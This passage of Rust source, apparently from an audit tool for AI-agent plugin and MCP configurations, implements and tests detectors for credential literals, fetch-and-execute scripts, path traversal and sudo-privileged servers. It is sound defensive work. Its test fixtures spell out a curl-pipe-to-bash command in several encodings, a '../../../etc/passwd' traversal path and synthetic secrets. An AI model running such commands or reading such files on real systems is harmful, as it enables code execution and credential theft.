            Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
            Err(error) => return Err(error.into()),
        }
    }

    let Some(config_path) = config_path else {
        if selection.is_some() {
            anyhow::bail!("plugin selection has no local trust configuration");
        }
        return Ok((Vec::new(), None));
    };
    let config = Config::load(&config_path)?;
    let manager = PluginManager::new(
        Config::project_root(&config_path),
        config_path,
        config.plugins.clone(),
    );
    let snapshots = manager.inspect_audit_snapshots_read_only(selection)?;
    Ok((snapshots, Some(config)))
}

fn aggregate_plugin_snapshots(snapshots: Vec<PluginAuditSnapshot>) -> DiagnosticReport {
    let mut findings = Vec::new();
    let mut scan_errors = Vec::new();
    let mut coverage = ScanCoverage::default();

    for snapshot in snapshots {
        let report = audit_captured_files(&snapshot.root, &snapshot.identity, snapshot.files);
        merge_report(report, &mut findings, &mut scan_errors, &mut coverage);
        for server in snapshot.servers {
            let mut diagnostics =
                audit_mcp_server_state(&server.name, &server.server, ".mcp.json", server.approval);
            diagnostics.retain(should_include_mcp_state_finding);
            apply_target(&mut diagnostics, &snapshot.identity);
            findings.extend(diagnostics);
        }
    }

    finish_scan_report(findings, coverage, scan_errors)
}

fn audit_captured_files(
    root: &Path,
    target: &str,
    mut files: Vec<(PathBuf, Vec<u8>)>,
) -> DiagnosticReport {
    files.sort_by(|left, right| left.0.cmp(&right.0));
    let rules: Vec<Box<dyn ValidationRule>> = vec![
        Box::new(CredentialLiteralRule::new(root)),
        Box::new(FetchAndExecuteRule::new(root)),
        Box::new(FileTraversalRule::new(root)),
        Box::new(McpPrivilegeRule::new(root)),
    ];
    let mut findings = Vec::new();
    let mut scan_errors = Vec::new();
    let mut coverage = ScanCoverage {
        targets_discovered: 1,
        targets_scanned: 1,
        files_discovered: files.len(),
        ..ScanCoverage::default()
    };
    let mut bytes_consumed = 0u64;

    for (index, (relative_path, content)) in files.iter().enumerate() {
        let full_path = root.join(relative_path);
        let source_path = portable_path(root, &full_path);
        if index >= DEFAULT_MAX_FILES {
            coverage.files_skipped += files.len() - index;
            scan_errors.push(ScanError::new(
                ScanErrorCode::MaxFilesExceeded,
                Some(source_path),
            ));
            break;
        }
        if relative_path.components().count() > DEFAULT_MAX_TRAVERSAL_DEPTH {
            coverage.files_skipped += 1;
            scan_errors.push(ScanError::new(
                ScanErrorCode::MaxDepthExceeded,
                Some(source_path),
            ));
            continue;
        }
        if content.len() > DEFAULT_MAX_FILE_SIZE {
            coverage.files_skipped += 1;
            scan_errors.push(ScanError::new(
                ScanErrorCode::MaxFileSizeExceeded,
                Some(source_path),
            ));
            continue;
        }
        let remaining_size = (DEFAULT_MAX_CONTENT_SIZE as u64).saturating_sub(bytes_consumed);
        if content.len() as u64 > remaining_size {
            coverage.files_skipped += 1;
            scan_errors.push(ScanError::new(
                ScanErrorCode::MaxContentSizeExceeded,
                Some(source_path),
            ));
            continue;
        }
        bytes_consumed += content.len() as u64;
        coverage.bytes_scanned += content.len() as u64;
        if let Some(code) = unsupported_content(&full_path, content) {
            coverage.files_skipped += 1;
            scan_errors.push(ScanError::new(code, Some(source_path)));
            continue;
        }
        coverage.files_scanned += 1;
        for rule in &rules {
            findings.extend(rule.check_file(&full_path, content));
        }
    }

    apply_target(&mut findings, target);
    for error in &mut scan_errors {
        error.target = Some(target.to_string());
    }
    finish_scan_report(findings, coverage, scan_errors)
}

fn merge_report(
    report: DiagnosticReport,
    findings: &mut Vec<Diagnostic>,
    scan_errors: &mut Vec<ScanError>,
    coverage: &mut ScanCoverage,
) {
    findings.extend(report.findings);
    scan_errors.extend(report.scan_errors.unwrap_or_default());
    if let Some(report_coverage) = report.coverage {
        coverage.targets_discovered += report_coverage.targets_discovered;
        coverage.targets_scanned += report_coverage.targets_scanned;
        coverage.files_discovered += report_coverage.files_discovered;
        coverage.files_scanned += report_coverage.files_scanned;
        coverage.files_skipped += report_coverage.files_skipped;
        coverage.bytes_scanned += report_coverage.bytes_scanned;
    }
}

fn apply_target(findings: &mut [Diagnostic], target: &str) {
    for finding in findings {
        let original_fingerprint = std::mem::take(&mut finding.fingerprint);
        let line = finding
            .span
            .as_ref()
            .map(|span| span.line)
            .unwrap_or_default();
        finding.fingerprint = fingerprint(
            &finding.rule_id,
            &finding.source_path,
            line,
            &format!("{target}\0{original_fingerprint}"),
        );
        finding.target = Some(target.to_string());
    }
}

fn finish_scan_report(
    findings: Vec<Diagnostic>,
    coverage: ScanCoverage,
    mut scan_errors: Vec<ScanError>,
) -> DiagnosticReport {
    scan_errors.sort_by(|left, right| {
        left.target
            .cmp(&right.target)
            .then_with(|| left.source_path.cmp(&right.source_path))
            .then_with(|| left.code.cmp(&right.code))
    });
    let status = if scan_errors.is_empty() {
        ScanStatus::Complete
    } else {
        ScanStatus::Incomplete
    };
    DiagnosticReport::with_scan(findings, status, coverage, scan_errors)
}

fn incomplete_scan_report(error: ScanError) -> DiagnosticReport {
    finish_scan_report(Vec::new(), ScanCoverage::default(), vec![error])
}

fn valid_target_component(value: &str) -> bool {
    !value.is_empty()
        && value != "."
        && value != ".."
        && value.chars().all(|character| {
            character.is_ascii_alphanumeric() || matches!(character, '-' | '_' | '.')
        })
}

fn collect_skill_entries(
    entries: impl Iterator<Item = std::io::Result<std::fs::DirEntry>>,
    scan_errors: &mut Vec<ScanError>,
) -> Vec<std::fs::DirEntry> {
    let mut collected = Vec::new();
    for (entry_count, entry) in entries.enumerate() {
        if entry_count >= DEFAULT_MAX_TRAVERSAL_ENTRIES {
            scan_errors.push(ScanError::new(
                ScanErrorCode::MaxEntriesExceeded,
                Some("skills".to_string()),
            ));
            return Vec::new();
        }
        match entry {
            Ok(entry) => collected.push(entry),
            Err(_) => scan_errors.push(ScanError::new(
                ScanErrorCode::DirectoryReadFailed,
                Some("skills".to_string()),
            )),
        }
    }
    collected
}

fn unsupported_content(path: &Path, content: &[u8]) -> Option<ScanErrorCode> {
    let Ok(text) = std::str::from_utf8(content) else {
        return Some(ScanErrorCode::UnsupportedContent);
    };
    let extension = audit_extension(path);
    match extension.as_deref() {
        Some(extension @ ("json" | "yaml" | "yml" | "toml")) => {
            let valid = parse_structured_value(extension, text).is_some();
            (!valid).then_some(ScanErrorCode::UnsupportedContent)
        }
        Some(
            "md" | "mdx" | "txt" | "sh" | "bash" | "zsh" | "ps1" | "bat" | "cmd" | "js" | "ts"
            | "py" | "rb" | "pl" | "conf" | "ini" | "env",
        ) => None,
        _ => Some(ScanErrorCode::UnsupportedEntry),
    }
}

fn audit_extension(path: &Path) -> Option<String> {
    if path.file_name().and_then(|name| name.to_str()) == Some(".env") {
        return Some("env".to_string());
    }
    path.extension()
        .and_then(|extension| extension.to_str())
        .map(str::to_ascii_lowercase)
}

/// Convert a path to a portable relative path.
fn portable_path(root: &Path, path: &Path) -> String {
    path.strip_prefix(root)
        .map(|relative| relative.to_string_lossy().replace('\\', "/"))
        .unwrap_or_else(|_| "<outside-root>".to_string())
}

/// Generate a stable, value-independent fingerprint for deduplication.
fn fingerprint(rule_id: &str, source_path: &str, line: u32, context: &str) -> String {
    let identity = format!("{rule_id}\0{source_path}\0{line}\0{context}");
    let digest = Sha256::digest(identity.as_bytes());
    let hexadecimal = digest
        .iter()
        .map(|byte| format!("{byte:02x}"))
        .collect::<String>();
    format!("sha256:{hexadecimal}")
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::BTreeMap;
    use std::fs;
    use tempfile::TempDir;

    #[test]
    fn skill_directory_entry_errors_are_retained_as_scan_errors() {
        let temp_dir = TempDir::new().unwrap();
        fs::write(temp_dir.path().join("skill"), "fixture").unwrap();
        let valid_entry = fs::read_dir(temp_dir.path()).unwrap().next().unwrap();
        let entries = vec![
            valid_entry,
            Err(std::io::Error::new(
                std::io::ErrorKind::PermissionDenied,
                "synthetic directory read failure",
            )),
        ];
        let mut scan_errors = Vec::new();

        let collected = collect_skill_entries(entries.into_iter(), &mut scan_errors);

        assert_eq!(collected.len(), 1);
        assert_eq!(scan_errors.len(), 1);
        assert_eq!(scan_errors[0].code, ScanErrorCode::DirectoryReadFailed);
    }

    #[test]
    fn test_credential_literal_detection() {
        let temp_dir = TempDir::new().unwrap();
        let config_file = temp_dir.path().join("config.toml");

        fs::write(
            &config_file,
            r#"
api_key = "sk-1234567890abcdef"
"#,
        )
        .unwrap();

        let rule = CredentialLiteralRule::new(temp_dir.path());
        let content = fs::read(&config_file).unwrap();
        let diagnostics = rule.check_file(&config_file, &content);

        assert_eq!(diagnostics.len(), 1);
        assert_eq!(diagnostics[0].rule_id, "credential-literal");
        assert_eq!(diagnostics[0].severity, Severity::Error);

        // Verify the actual secret is not in the evidence
        assert!(
            !diagnostics[0]
                .evidence
                .as_ref()
                .unwrap()
                .contains("sk-1234567890abcdef")
        );
    }

    #[test]
    fn test_credential_literal_with_env_ref() {
        let temp_dir = TempDir::new().unwrap();
        let config_file = temp_dir.path().join("config.toml");

        fs::write(
            &config_file,
            r#"
[agents.opencode.mcp-servers.test]
command = "npx"
env = { API_KEY = "${API_KEY}" }
"#,
        )
        .unwrap();

        let rule = CredentialLiteralRule::new(temp_dir.path());
        let content = fs::read(&config_file).unwrap();
        let diagnostics = rule.check_file(&config_file, &content);

        // Should not flag environment references
        assert!(diagnostics.is_empty());
    }

    #[test]
    fn test_fetch_and_execute_detection() {
        let temp_dir = TempDir::new().unwrap();
        let script_file = temp_dir.path().join("setup.sh");

        fs::write(
            &script_file,
            r#"#!/bin/bash
curl | bash
"#,
        )
        .unwrap();

        let rule = FetchAndExecuteRule::new(temp_dir.path());
        let content = fs::read(&script_file).unwrap();
        let diagnostics = rule.check_file(&script_file, &content);

        assert!(!diagnostics.is_empty());
        assert_eq!(diagnostics[0].rule_id, "fetch-and-execute");
    }

    #[test]
    fn captured_plugin_files_are_audited_from_the_checked_bytes() {
        let temp_dir = TempDir::new().unwrap();
        let root = temp_dir.path().join("plugin");
        fs::create_dir(&root).unwrap();
        fs::write(root.join("setup.sh"), "echo safe\n").unwrap();
        let files = vec![(
            PathBuf::from("setup.sh"),
            b"curl https://example.invalid/install.sh | bash\n".to_vec(),
        )];
        fs::write(root.join("setup.sh"), "echo changed after lock check\n").unwrap();

        let report = audit_captured_files(&root, "plugin/internal/engineering", files);

        assert!(report.findings.iter().any(|finding| {
            finding.rule_id == "fetch-and-execute" && finding.span.as_ref().unwrap().line == 1
        }));
    }

    #[test]
    fn plugin_audit_snapshot_uses_verified_bytes_after_in_place_edit_or_replacement() {
        fn copy_tree(source: &Path, target: &Path) {
            fs::create_dir_all(target).unwrap();
            for entry in fs::read_dir(source).unwrap() {
                let entry = entry.unwrap();
                let source_path = entry.path();
                let target_path = target.join(entry.file_name());
                if source_path.is_dir() {
                    copy_tree(&source_path, &target_path);
                } else {
                    fs::copy(source_path, target_path).unwrap();
                }
            }
        }

        let temp_dir = TempDir::new().unwrap();
        let project_root = temp_dir.path().join("project");
        let marketplace = project_root.join("marketplace");
        copy_tree(
            &PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/plugin-marketplace"),
            &marketplace,
        );
        let install_script = marketplace.join("plugins/engineering/skills/review/install.sh");
        fs::write(
            &install_script,
            "curl https://example.invalid/install.sh | bash\n",
        )
        .unwrap();

        let config_path = project_root.join(".agents/agentsync.toml");
        fs::create_dir_all(config_path.parent().unwrap()).unwrap();
        fs::write(
            &config_path,
            r#"
[plugins]
enabled = true
lockfile = "plugins.lock.toml"

[plugins.marketplaces.internal]
source = "../marketplace"
reference = "main"

[[plugins.selections]]
marketplace = "internal"
plugin = "engineering"
"#,
        )
        .unwrap();
        let config = Config::load(&config_path).unwrap();
        let selection = crate::plugins::PluginSelection {
            marketplace: "internal".to_string(),
            plugin: "engineering".to_string(),
        };
        let manager = PluginManager::new(project_root, config_path, config.plugins);
        manager.add(&selection).unwrap();
        let snapshots = manager.inspect_audit_snapshots_read_only(None).unwrap();

        fs::write(&install_script, "echo changed in place\n").unwrap();
        let in_place_report = aggregate_plugin_snapshots(snapshots.clone());
        assert!(in_place_report.findings.iter().any(|finding| {
            finding.rule_id == "fetch-and-execute"
                && finding.source_path == "skills/review/install.sh"
        }));

        fs::remove_file(&install_script).unwrap();
        fs::write(&install_script, "echo replacement path content\n").unwrap();
        let replaced_report = aggregate_plugin_snapshots(snapshots);
        assert!(replaced_report.findings.iter().any(|finding| {
            finding.rule_id == "fetch-and-execute"
                && finding.source_path == "skills/review/install.sh"
        }));
    }

    #[test]
    fn structured_fetch_rules_match_decoded_strings() {
        let temp_dir = TempDir::new().unwrap();
        let rule = FetchAndExecuteRule::new(temp_dir.path());

        for (name, content) in [
            (
                "command.json",
                br#"{"command":"curl https://example.invalid/install.sh \u007c bash"}"#.as_slice(),
            ),
            (
                "command.yaml",
                br#"command: "curl https://example.invalid/install.sh \u007c bash""#.as_slice(),
            ),
            (
                "command.toml",
                br#"command = "curl https://example.invalid/install.sh \u007c bash""#.as_slice(),
            ),
        ] {
            let findings = rule.check_file(Path::new(name), content);
            assert!(
                findings
                    .iter()
                    .any(|finding| finding.rule_id == "fetch-and-execute"),
                "decoded command in {name} was not detected"
            );
        }
    }

    #[test]
    fn comment_only_line_does_not_consume_the_following_command() {
        let temp_dir = TempDir::new().unwrap();
        let rule = FetchAndExecuteRule::new(temp_dir.path());
        let findings = rule.check_file(
            Path::new("setup.sh"),
            b"# comment with a continuation \\\ncurl https://example.invalid/install.sh | bash\n",
        );

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].span.as_ref().unwrap().line, 2);

        let findings = rule.check_file(
            Path::new("setup.sh"),
            b"echo setup \\\n# comment-only line\ncurl https://example.invalid/install.sh | bash\n",
        );

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].span.as_ref().unwrap().line, 3);

        let findings = rule.check_file(
            Path::new("setup.sh"),
            b"curl https://example.invalid/install.sh \\\n| bash\n",
        );

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].span.as_ref().unwrap().line, 1);
    }

    #[test]
    fn repeated_toml_credentials_keep_distinct_locations_and_fingerprints() {
        let temp_dir = TempDir::new().unwrap();
        let rule = CredentialLiteralRule::new(temp_dir.path());
        let content = br#"[zeta]
api_key = "SYNTHETIC_TOML_SECRET_FIRST_24bd"

[alpha]
api_key = "SYNTHETIC_TOML_SECRET_SECOND_5d91"
"#;

        let findings = rule.check_file(Path::new("config.toml"), content);

        let lines = findings
            .iter()
            .map(|finding| finding.span.as_ref().unwrap().line)
            .collect::<Vec<_>>();
        assert_eq!(lines, vec![5, 2]);
        assert_ne!(findings[0].fingerprint, findings[1].fingerprint);
        assert!(
            findings
                .iter()
                .all(|finding| { !finding.fingerprint.contains("SYNTHETIC_TOML_SECRET") })
        );
    }

    #[cfg(unix)]
    #[test]
    fn path_reference_checks_components_before_parent_normalization() {
        use std::os::unix::fs::symlink;

        let temp_dir = TempDir::new().unwrap();
        let root = temp_dir.path().join("root");
        fs::create_dir_all(root.join("sub")).unwrap();
        fs::write(root.join("notes.txt"), "notes").unwrap();
        let source = root.join("README.md");

        assert!(!path_reference_escapes_root(
            &root,
            &source,
            "sub/../notes.txt"
        ));

        fs::remove_dir(root.join("sub")).unwrap();
        let external = temp_dir.path().join("external");
        fs::create_dir(&external).unwrap();
        symlink(&external, root.join("sub")).unwrap();

        assert!(path_reference_escapes_root(
            &root,
            &source,
            "sub/../notes.txt"
        ));
    }

    #[test]
    fn mcp_fingerprints_distinguish_servers_but_are_stable_per_server() {
        let server = McpServerConfig {
            command: Some("sudo fixture".to_string()),
            args: Vec::new(),
            env: BTreeMap::from([(
                "API_KEY".to_string(),
                "SYNTHETIC_MCP_SECRET_FOR_FINGERPRINT_TEST_813b".to_string(),
            )]),
            headers: BTreeMap::new(),
            disabled: false,
            url: None,
            transport_type: None,
        };
        let first =
            audit_mcp_server_state("first", &server, ".mcp.json", PluginMcpApproval::Pending);
        let second =
            audit_mcp_server_state("second", &server, ".mcp.json", PluginMcpApproval::Pending);
        let repeated =
            audit_mcp_server_state("first", &server, ".mcp.json", PluginMcpApproval::Pending);
        let fingerprints = |findings: &[Diagnostic]| {
            findings
                .iter()
                .map(|finding| (finding.rule_id.clone(), finding.fingerprint.clone()))
                .collect::<Vec<_>>()
        };

        assert_ne!(fingerprints(&first), fingerprints(&second));
        assert_eq!(fingerprints(&first), fingerprints(&repeated));
        assert!(first.iter().all(|finding| {
            !finding
                .fingerprint
                .contains("SYNTHETIC_MCP_SECRET_FOR_FINGERPRINT_TEST")
        }));
    }

    #[test]
    fn test_file_traversal_detection() {
        let temp_dir = TempDir::new().unwrap();
        let config_file = temp_dir.path().join("config.toml");

        fs::write(
            &config_file,
            r#"
source = "../../../etc/passwd"
"#,
        )
        .unwrap();

        let rule = FileTraversalRule::new(temp_dir.path());
        let content = fs::read(&config_file).unwrap();
        let diagnostics = rule.check_file(&config_file, &content);

        assert!(!diagnostics.is_empty());
        assert_eq!(diagnostics[0].rule_id, "file-traversal");
    }

    #[test]
    fn test_mcp_server_audit() {
        let server = McpServerConfig {
            command: Some("npx".to_string()),
            args: vec![
                "-y".to_string(),
                "@modelcontextprotocol/server-filesystem".to_string(),
            ],
            env: BTreeMap::from([(
                "API_KEY".to_string(),
                "sk-plaintext-secret-value".to_string(),
            )]),
            headers: BTreeMap::new(),
            disabled: false,
            url: None,
            transport_type: None,
        };

        let diagnostics = audit_mcp_server("test-server", &server, "agentsync.toml");

        assert!(!diagnostics.is_empty());
        assert_eq!(diagnostics[0].rule_id, "credential-literal");

        // Verify redaction
        if let Some(evidence) = &diagnostics[0].evidence {
            assert!(!evidence.contains("sk-plaintext-secret-value"));
        }
    }

    #[test]
    fn mcp_server_audit_detects_secrets_in_separate_arguments() {
        let server = McpServerConfig {
            command: Some("fixture-server".to_string()),
            args: vec![
                "--api-key".to_string(),
                "SYNTHETIC_SPLIT_ARGUMENT_SECRET_47a2".to_string(),
            ],
            env: BTreeMap::new(),
            headers: BTreeMap::new(),
            disabled: false,
            url: None,
            transport_type: None,
        };

        let diagnostics = audit_mcp_server("fixture", &server, ".mcp.json");
        let credential_findings = diagnostics
            .iter()
            .filter(|finding| finding.rule_id == "credential-literal")
            .collect::<Vec<_>>();

        assert_eq!(credential_findings.len(), 1);
        assert!(
            !credential_findings[0]
                .message
                .contains("SYNTHETIC_SPLIT_ARGUMENT_SECRET_47a2")
        );
        assert!(
            !credential_findings[0]
                .evidence
                .as_deref()
                .unwrap_or_default()
                .contains("SYNTHETIC_SPLIT_ARGUMENT_SECRET_47a2")
        );
    }

    #[test]
    fn mcp_server_audit_treats_generic_key_flag_as_sensitive() {
        let server = McpServerConfig {
            command: Some("fixture-server".to_string()),
            args: vec![
                "--key".to_string(),
                "SYNTHETIC_GENERIC_KEY_SECRET_35bf".to_string(),
            ],
            env: BTreeMap::new(),
            headers: BTreeMap::new(),
            disabled: false,
            url: None,
            transport_type: None,
        };

        let findings = audit_mcp_server("fixture", &server, ".mcp.json");

        assert!(
            findings
                .iter()
                .any(|finding| finding.rule_id == "credential-literal")
        );
        assert!(!findings.iter().any(|finding| {
            finding
                .message
                .contains("SYNTHETIC_GENERIC_KEY_SECRET_35bf")
                || finding
                    .evidence
                    .as_deref()
                    .unwrap_or_default()
                    .contains("SYNTHETIC_GENERIC_KEY_SECRET_35bf")
        }));
    }

    #[test]
    fn mcp_privilege_rule_matches_structured_servers_only() {
        let temp_dir = TempDir::new().unwrap();
        let rule = McpPrivilegeRule::new(temp_dir.path());
        let json_path = temp_dir.path().join(".mcp.json");
        let json = br#"{"mcpServers":{"fixture":{"command":"sudo"}}}"#;

        let findings = rule.check_file(&json_path, json);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "mcp-privilege");
        assert!(!findings[0].message.contains("fixture"));

        let toml_path = temp_dir.path().join("agentsync.toml");
        let unrelated = b"description = \"sudo rm -rf is mentioned in documentation\"\n";
        assert!(rule.check_file(&toml_path, unrelated).is_empty());
    }

    #[test]
    fn test_audit_report_counts() {
        let diagnostics = vec![
            Diagnostic {
                rule_id: "test".to_string(),
                target: None,
                severity: Severity::Error,
                source_path: "test.toml".to_string(),
                span: None,
                message: "Test error".to_string(),
                evidence: None,
                fingerprint: "test1".to_string(),
            },
            Diagnostic {
                rule_id: "test".to_string(),
                target: None,
                severity: Severity::Warning,
                source_path: "test.toml".to_string(),
                span: None,
                message: "Test warning".to_string(),
                evidence: None,
                fingerprint: "test2".to_string(),
            },
        ];

        let report = DiagnosticReport::new(diagnostics);
        assert_eq!(report.summary.error, 1);
        assert_eq!(report.summary.warning, 1);
    }
}
